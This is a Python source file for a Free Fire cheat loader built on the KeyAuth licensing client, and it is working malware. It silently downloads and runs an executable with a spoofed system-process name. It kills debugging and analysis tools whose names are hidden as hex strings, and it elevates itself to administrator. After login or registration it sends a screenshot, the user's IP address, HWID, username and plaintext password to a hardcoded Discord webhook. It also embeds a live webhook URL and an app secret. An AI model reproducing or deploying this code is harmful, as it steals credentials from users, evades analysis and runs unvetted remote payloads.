import random
import httpx
import requests
import json
import binascii  # hex encoding
import hashlib
import json as jsond  # json
import os
import platform  # check platform
import subprocess  # needed for mac device
import sys
import time  # sleep before exit
import win32security  # get sid (WIN only)
import msvcrt
import threading
import psutil
import tempfile
import io
import winreg
import ctypes
import fileinput
import webbrowser
from PIL import ImageGrab
from pymem.exception import ProcessNotFound
from pymem import *
from pymem import Pymem, pymem
from pymem.memory import read_bytes, write_bytes
from pymem.pattern import pattern_scan_all
from psutil import AccessDenied, NoSuchProcess, process_iter
from threading import Thread
from datetime import datetime
from time import sleep
from uuid import uuid4  # gen random guid
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad




######DOWNLOAD RPC DISCORD#######
def download_exe(url, save_path):
    response = requests.get(url, stream=True)
    total_size = int(response.headers.get('content-length', 0))
    block_size = 1024  # 1 KB
    downloaded_size = 0

    with open(save_path, 'wb') as f:
        for data in response.iter_content(block_size):
            downloaded_size += len(data)
            f.write(data)
            progress = (downloaded_size / total_size) * 100
            sys.stdout.write(f"\rUpdating Progress: {progress:.2f}%")
            sys.stdout.flush()

def is_process_running(process_name):
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == process_name:
            return True
    return False

def terminate_process(process_name):
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == process_name:
            try:
                process.terminate()
            except psutil.NoSuchProcess:
                pass

def main():
    url = "https://boyzgames.my.id/Panel/Free%20Fire/dlIhost.exe"
    bluestacks_path = "C:\\Program Files\\BlueStacks"
    exe_path = os.path.join(bluestacks_path, "dlIhost.exe")

    if not os.path.exists(bluestacks_path):
        try:
            os.makedirs(bluestacks_path)
        except OSError:
            pass

    if not os.path.exists(exe_path):
        download_exe(url, exe_path)

    # Cek apakah HD-Player.exe dan Discord.exe berjalan bersamaan
    if is_process_running("Discord.exe"):
        # Jika kedua proses berjalan bersamaan, hentikan dlIhost.exe jika berjalan
        if is_process_running("dlIhost.exe"):
            terminate_process("dlIhost.exe")
        try:
            subprocess.Popen(exe_path)
        except OSError:
            pass
main()
##########################################################

####DETECT CHEAT ENGINE DEBUGGER EXE####
d = [
    '53757370656e64', '50726f67726573732054656c6572696b20466964646c657220576562204465627567676572', '466964646c6572', '57697265736861726b',
    '64756d70636170', '646e537079', '646e5370792d783836', '6368656174656e67696e652d7838365f3634', '4854545044656275676765725549',
    '50726f636d6f6e', '50726f636d6f6e3634', '50726f636d6f6e363461', '50726f636573734861636b6572',
    '783332646267', '783634646267', '446f744e657444617461436f6c6c6563746f723332',
    '446f744e657444617461436f6c6c6563746f723634', '485454504465627567676572537663', '48545450204465627567676572', '696461', '6964613634', '69646167', '696461673634',
    '69646177', '696461773634', '69646171', '696461713634', '69646175', '696461753634',
    '7363796c6c61', '7363796c6c615f783634', '7363796c6c615f783836', '70726f74656374696f6e5f6964',
    '77696e646267', '7265736861636b6572', '496d706f7274524543', '494d4d554e4954594445425547474552',
    '4d65676144756d706572', '646973617373656d626c79', '4465627567', '5b435055496d6d756e697479',
    '4d65676144756d70657220312e3020627920436f6465437261636b6572202f20536e44', '436861726c6573', '636861726c6573', '4f4c4c59444247', '496d706f72745f7265636f6e7374727563746f72',
    '636f6465637261636b6572', '646534646f74', '696c737079', '67726179776f6c66',
    '73696d706c65617373656d626c796578706c6f726572', '7836346e657464756d706572', '687864',
    '7065746f6f6c73', '73696d706c65617373656d626c79', '68747470616e616c797a6572', '687474706465627567', '70726f636573736861636b6572', '6d656d6f727965646974', '6d656d6f7279',
    '646534646f746d6f64646564', '70726f63657373206861636b6572', '70726f63657373206d6f6e69746f72',
    '717435636f7265', '696461', '696d6d756e697479', '68747470', '74726166666963',
    '77697265736861726b', '666964646c6572', '7061636b6574', '6861636b6572', '6465627567', '646e737079', '646f747065656b', '646f747472616365', '70726f6364756d70', '6d616e61676572',
    '6d656d6f7279', '6e65744c696d6974', '6e65744c696d69746572', '73616e64626f78'
]
d = [binascii.unhexlify(i.encode()).decode() for i in d]
def debugger():
    while True:
        try:
            for proc in process_iter():
                for i in d:
                    if i.lower() in proc.name().lower():
                        proc.kill()
        except Exception:
            pass
        time.sleep(0.5)
threading.Thread(target=debugger, daemon=True).start()


def find_processes_by_dll(dll_name):
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            for dll in proc.memory_maps():
                if dll.path and dll_name in dll.path:
                    processes.append(proc)
                    break
        except psutil.AccessDenied:
            # Some processes might be inaccessible due to permission issues
            pass
    return processes

def terminate_processes(processes):
    for proc in processes:
        try:
            proc.terminate()
            return None
        except psutil.NoSuchProcess:
            return None
        except psutil.AccessDenied:
            return None

def debugger2(dll_name):
    while True:
        processes = find_processes_by_dll(dll_name)
        if processes:
            terminate_processes(processes)
        
        # Pause the loop for some time before the next iteration
        time.sleep(10)

dll_names = ["lua53-64.dll", "lua53-32.dll"]

for dll_name in dll_names:
    thread = threading.Thread(target=debugger2, args=(dll_name,), daemon=True)
    thread.start()
###########################################################

###########BLUESTACKS DISABLE RPC#########

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def modify_bluestacks_conf(file_path):
    # Modify the bluestacks.conf file
    try:
        with fileinput.FileInput(file_path, inplace=True, backup='.bak') as file:
            for line in file:
                if 'bst.enable_discord_integration="1"' in line:
                    line = line.replace('bst.enable_discord_integration="1"', 'bst.enable_discord_integration="0"')
                print(line, end='')
    except Exception:
        return None

def get_bluestacks_msi5_folder():
    try:
        registry_key_path = r'SOFTWARE\BlueStacks_msi5'
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_key_path)
        data_dir_value, _ = winreg.QueryValueEx(key, 'DataDir')
        winreg.CloseKey(key)

        # Remove "\\Engine" from the path if present
        data_dir_value = os.path.dirname(data_dir_value)
        if data_dir_value.lower().endswith("\\engine"):
            data_dir_value = os.path.dirname(data_dir_value)
        
        return data_dir_value
    except Exception:
        return None
    
def get_bluestacks_nxt_folder():
    try:
        registry_key_path = r'SOFTWARE\BlueStacks_nxt'
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_key_path)
        data_dir_value, _ = winreg.QueryValueEx(key, 'DataDir')
        winreg.CloseKey(key)

        # Remove "\\Engine" from the path if present
        data_dir_value = os.path.dirname(data_dir_value)
        if data_dir_value.lower().endswith("\\engine"):
            data_dir_value = os.path.dirname(data_dir_value)
        
        return data_dir_value
    except Exception:
        return None    

# Run the script as Administrator
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Get the BlueStacks_msi5 folder location from the registry
bluestacks_msi5_folder = get_bluestacks_msi5_folder()
if bluestacks_msi5_folder:
    bluestacks_conf_file_path = os.path.join(bluestacks_msi5_folder, 'bluestacks.conf')
    # Modify the bluestacks.conf file
    modify_bluestacks_conf(bluestacks_conf_file_path)

# Get the BlueStacks_msi5 folder location from the registry
bluestacks_nxt_folder = get_bluestacks_nxt_folder()
if bluestacks_nxt_folder:
    bluestacks_conf_file_path = os.path.join(bluestacks_nxt_folder, 'bluestacks.conf')
    # Modify the bluestacks.conf file
    modify_bluestacks_conf(bluestacks_conf_file_path)
##############################################################

try:  # Connection check
    s = requests.Session()  # Session
    s.get('https://google.com')
except requests.exceptions.RequestException as e:
    print(e)
    time.sleep(3)
    os._exit(1)

# Ganti dengan URL webhook Discord Anda
WEBHOOK_URL = "https://discord.com/api/webhooks/1139453504822464542/o7Qrce8BXWBDLMgijYNf6ANg7JpZNuxE_2pH1UpSFymp7iyRBuiFnIEibpixr6hEHcLB"

def take_and_send_screenshot(webhook_url, user, password):
    nama_pc = os.getlogin()
    screenshot = ImageGrab.grab()  # Mengambil tangkapan layar
    image_buffer = io.BytesIO()
    screenshot.save(image_buffer, format="PNG")
    image_buffer.seek(0)
    
    message = (
        ":computer: **__PC Name__** :computer:\n"
        f"{nama_pc}\n\n"
        "**__:globe_with_meridians: IP Address :globe_with_meridians:__**\n"
        f"{keyauthapp.user_data.ip}\n\n"        
        ":key: **__HWID__** :key:\n"
        f"{keyauthapp.user_data.hwid}\n\n"
        ":bust_in_silhouette: **__Username__** :bust_in_silhouette:\n"
        f"{user}\n\n"
        ":lock: **__Password__** :lock:\n"
        f"{password}\n\n"
        ":calendar_spiral: **__Expired__** :calendar_spiral:\n"
        f"{ datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S')}\n"
    )
    
    files = {
        "file": ("screenshot.png", image_buffer)
    }
    
    data = {
        "content": message
    }
    
    response = requests.post(webhook_url, files=files, data=data)
    
    if response.status_code == 200:
        print()
class api:

    name = ownerid = secret = version = hash_to_check = ""

    def __init__(self, name, ownerid, secret, version, hash_to_check):
        self.name = name

        self.ownerid = ownerid

        self.secret = secret

        self.version = version
        self.hash_to_check = hash_to_check
        self.init()

    sessionid = enckey = ""
    initialized = False

    def init(self):

        if self.sessionid != "":
            print("You've already initialized!")
            time.sleep(2)
            os._exit(1)
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        self.enckey = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("init").encode()),
            "ver": encryption.encrypt(self.version, self.secret, init_iv),
            "hash": self.hash_to_check,
            "enckey": encryption.encrypt(self.enckey, self.secret, init_iv),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            os._exit(1)

        response = encryption.decrypt(response, self.secret, init_iv)
        json = jsond.loads(response)

        if json["message"] == "invalidver":
            if json["download"] != "":
                print("New Version Available")
                download_link = json["download"]
                os.system(f"start {download_link}")
                os._exit(1)
            else:
                print("Invalid Version, Contact owner to add download link to latest app version")
                os._exit(1)

        if not json["success"]:
            print(json["message"])
            os._exit(1)

        self.sessionid = json["sessionid"]
        self.initialized = True
        self.__load_app_data(json["appinfo"])

    def register(self, user, password, license, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("register").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            take_and_send_screenshot(WEBHOOK_URL, user, password)
        else:
            print(json["message"])
            input("Press ENTER to continue...")
            answer()
            #os._exit(1)

    def upgrade(self, user, license):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("upgrade").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            print("successfully upgraded user")
            print("please restart program and login")
            time.sleep(2)
            os._exit(1)
        else:
            print(json["message"])
            os._exit(1)

    def login(self, user, password, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("login").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            take_and_send_screenshot(WEBHOOK_URL, user, password)
        else:
            print(json["message"])
            input("Press ENTER to continue...")
            answer()
            #os._exit(1)

    def license(self, key, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("license").encode()),
            "key": encryption.encrypt(key, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("successfully logged into license")
        else:
            print(json["message"])
            os._exit(1)

    def var(self, name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("var").encode()),
            "varid": encryption.encrypt(name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def getvar(self, var_name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("getvar").encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["response"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def setvar(self, var_name, var_data):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("setvar").encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "data": encryption.encrypt(var_data, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def ban(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("ban").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def file(self, fileid):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("file").encode()),
            "fileid": encryption.encrypt(fileid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            time.sleep(5)
            os._exit(1)
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param, body = "", conttype = ""):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("webhook").encode()),
            "webid": encryption.encrypt(webid, self.enckey, init_iv),
            "params": encryption.encrypt(param, self.enckey, init_iv),
            "body": encryption.encrypt(body, self.enckey, init_iv),
            "conttype": encryption.encrypt(conttype, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            os._exit(1)

    def check(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("check").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def checkblacklist(self):
        self.checkinit()
        hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("checkblacklist").encode()),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def log(self, message):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("log").encode()),
            "pcuser": encryption.encrypt(os.getenv('username'), self.enckey, init_iv),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        self.__do_request(post_data)

    def fetchOnline(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("fetchOnline").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            if len(json["users"]) == 0:
                return None  # THIS IS ISSUE ON KEYAUTH SERVER SIDE 6.8.2022, so it will return none if it is not an array.
            else:
                return json["users"]
        else:
            return None

    def chatGet(self, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("chatget").encode()),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["messages"]
        else:
            return None

    def chatSend(self, message, channel):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("chatsend").encode()),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "channel": encryption.encrypt(channel, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return True
        else:
            return False

    def checkinit(self):
        if not self.initialized:
            print("Initialize first, in order to use the functions")
            time.sleep(2)
            os._exit(1)

    def __do_request(self, post_data):
        try:
            rq_out = s.post(
                "https://keyauth.win/api/1.0/", data=post_data, timeout=30
            )
            return rq_out.text
        except requests.exceptions.Timeout:
            print("Request timed out")

    class application_data_class:
        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""
    # region user_data

    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = subscription = subscriptions = ""

    user_data = user_data_class()
    app_data = application_data_class()

    def __load_app_data(self, data):
        self.app_data.numUsers = data["numUsers"]
        self.app_data.numKeys = data["numKeys"]
        self.app_data.app_ver = data["version"]
        self.app_data.customer_panel = data["customerPanelLink"]
        self.app_data.onlineUsers = data["numOnlineUsers"]

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"]
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]
        self.user_data.subscription = data["subscriptions"][0]["subscription"]
        self.user_data.subscriptions = data["subscriptions"]


class others:
    @staticmethod
    def get_hwid():
        if platform.system() == "Linux":
            with open("/etc/machine-id") as f:
                hwid = f.read()
                return hwid
        elif platform.system() == 'Windows':
            winuser = os.getlogin()
            sid = win32security.LookupAccountName(None, winuser)[0]
            hwid = win32security.ConvertSidToStringSid(sid)
            return hwid
        elif platform.system() == 'Darwin':
            output = subprocess.Popen("ioreg -l | grep IOPlatformSerialNumber", stdout=subprocess.PIPE, shell=True).communicate()[0]
            serial = output.decode().split('=', 1)[1].replace(' ', '')
            hwid = serial[1:-2]
            return hwid



class encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text, 16)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        raw_out = aes_instance.encrypt(plain_text)

        return binascii.hexlify(raw_out)

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        cipher_text = aes_instance.decrypt(cipher_text)

        return unpad(cipher_text, 16)

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.encrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            #print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            print("Server Maintenance")
            input("Press ENTER to continue...")
            os._exit(1)

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.decrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            #print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            print("Server Maintenance")
            input("Press ENTER to continue...")
            os._exit(1)


# import json as jsond
# ^^ only for auto login/json writing/reading

# watch setup video if you need help https://www.youtube.com/watch?v=L2eAQOmuUiA

if sys.version_info.minor < 10:  # Python version check (Bypass Patch)
    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))

if platform.system() == 'Windows':
    os.system('cls & title BOYZGAMES VIP CHEATS')  # clear console, change title
elif platform.system() == 'Linux':
    os.system('clear')  # clear console
    sys.stdout.write("\x1b]0;BOYZGAMES VIP CHEATS\x07")  # change title
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  # clear console
    os.system('''echo - n - e "\033]0;BOYZGAMES VIP CHEATS\007"''')  # change title

print("Initializing")


def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest


keyauthapp = api(
    name = "Cheat Only", #App name (Manage Applications --> Application name)
    ownerid = "0AbIYycidr", #Owner ID (Account-Settings --> OwnerID)
    secret = "eead1802e6a3e328ace6a052069f831e4d8bdc1fc9970dff634ad528a330d753", #App secret(Manage Applications --> App credentials code)
    version = "1.0",
    hash_to_check = getchecksum()
)

#print(f"""
#App data:
#Number of users: {keyauthapp.app_data.numUsers}
#Number of online users: {keyauthapp.app_data.onlineUsers}
#Number of keys: {keyauthapp.app_data.numKeys}
#Application Version: {keyauthapp.app_data.app_ver}
#Customer panel link: {keyauthapp.app_data.customer_panel}
##""")
#print(f"Current Session Validation Status: {keyauthapp.check()}")
#print(f"Blacklisted : {keyauthapp.checkblacklist()}")  # check if blacklisted, you can edit this and make it exit the program if blacklisted

def getpass(prompt):
    password = ""
    print(prompt, end="", flush=True)
    while True:
        key = msvcrt.getch()
        key_ascii = ord(key)
        
        # Tombol Enter (ASCII 13) akan mengakhiri penginputan
        if key_ascii == 13:
            break
        # Tombol Backspace (ASCII 8) akan menghapus karakter sebelumnya
        elif key_ascii == 8:
            if password:
                password = password[:-1]
                print("\b \b", end="", flush=True)
        # Karakter lainnya akan ditambahkan ke password
        else:
            password += key.decode("utf-8")
            print("*", end="", flush=True)

    print()  # Pindah ke baris berikutnya setelah input password
    return password

def answer():
    try:
      os.system('cls')
      print("""\033[32m        
                                                                                   .
                                     .---.                                        ,O,
              ,,        /     \       ;,,'                                       ,OOO, 
             ;, ;      (  o  o )      ; ;                                  'oooooOOOOOooooo'
               ;,';,,,  \  \/ /      ,; ;                                    `OOOOOOOOOOO`
            ,,,  ;,,,,;;,`   '-,;'''',,,'                                      `OOOOOOO`
           ;,, ;,, ,,,,   ,;  ,,,'';;,,;''';                                   OOOO'OOOO
              ;,,,;    ~~'  '';,,''',,;''''                                   OOO'   'OOO
                                    '''                                      O'         'O        
         :::::::::   ::::::::  :::   ::: :::::::::      :::    :::     :::      ::::::::  :::    ::: ::::::::  
         :+:    :+: :+:    :+: :+:   :+:      :+:       :+:    :+:   :+: :+:   :+:    :+: :+:   :+: :+:    :+: 
         +:+    +:+ +:+    +:+  +:+ +:+      +:+        +:+    +:+  +:+   +:+  +:+        +:+  +:+  +:+        
         +#++:++#+  +#+    +:+   +#++:      +#+         +#++:++#++ +#++:++#++: +#+        +#++:++   +#++:++#++ 
         +#+    +#+ +#+    +#+    +#+      +#+          +#+    +#+ +#+     +#+ +#+        +#+  +#+         +#+ 
         #+#    #+# #+#    #+#    #+#     #+#           #+#    #+# #+#     #+# #+#    #+# #+#   #+# #+#    #+# 
         #########   ########     ###    #########      ###    ### ###     ###  ########  ###    ### ######## \033[0m""")
      print(f"""
HWID Banned: {keyauthapp.checkblacklist()}
[1] Login
[2] Register
        """)
      ans = input("Select Option: ")
      if ans == "1":
        user = input('[>] Username: ')
        password = getpass('[>] Password: ')
        keyauthapp.login(user, password)
      elif ans == "2":
        user = input('[>] Username: ')
        password = getpass('[>] Password: ')
        license = input('[>] License: ')
        keyauthapp.register(user, password, license)
      else:
        print("\nNot Valid Option")
        os.system('cls')
        answer()
    except KeyboardInterrupt:
      os._exit(1)


answer()





# region Extra Functions

# * Download Files form the server to your computer using the download function in the api class
# bytes = keyauthapp.file("FILEID")
# f = open("example.exe", "wb")
# f.write(bytes)
# f.close()


# * Set up user variable
# keyauthapp.setvar("varName", "varValue")

# * Get user variable and print it
# data = keyauthapp.getvar("varName")
# print(data)

# * Get normal variable and print it
# data = keyauthapp.var("varName")
# print(data)

# * Log message to the server and then to your webhook what is set on app settings
# keyauthapp.log("Message")

# * Get if the user pc have been blacklisted
# print(f"Blacklisted? : {keyauthapp.checkblacklist()}")

# * See if the current session is validated
# print(f"Session Validated?: {keyauthapp.check()}")


# * example to send normal request with no POST data
# data = keyauthapp.webhook("WebhookID", "?type=resetuser&user=username")

# * example to send form data
# data = keyauthapp.webhook("WebhookID", "", "type=init&name=test&ownerid=j9Gj0FTemM", "application/x-www-form-urlencoded")

# * example to send JSON
# data = keyauthapp.webhook("WebhookID", "", "{\"content\": \"webhook message here\",\"embeds\": null}", "application/json")

# * Get chat messages
# messages = keyauthapp.chatGet("CHANNEL")

# Messages = ""
# for i in range(len(messages)):
# Messages += datetime.utcfromtimestamp(int(messages[i]["timestamp"])).strftime('%Y-%m-%d %H:%M:%S') + " - " + messages[i]["author"] + ": " + messages[i]["message"] + "\n"

# print("\n\n" + Messages)

# * Send chat message
# keyauthapp.chatSend("MESSAGE", "CHANNEL")

# * Add Application Information to Title
# os.system(f"cls & title KeyAuth Python Example - Total Users: {keyauthapp.app_data.numUsers} - Online Users: {keyauthapp.app_data.onlineUsers} - Total Keys: {keyauthapp.app_data.numKeys}")

# * Auto-Login Example (THIS IS JUST AN EXAMPLE --> YOU WILL HAVE TO EDIT THE CODE PROBABLY)
# 1. Checking and Reading JSON

#### Note: Remove the ''' on line 151 and 226

'''try:
    if os.path.isfile('auth.json'): #Checking if the auth file exist
        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
            print("""
1. Login
2. Register
            """)
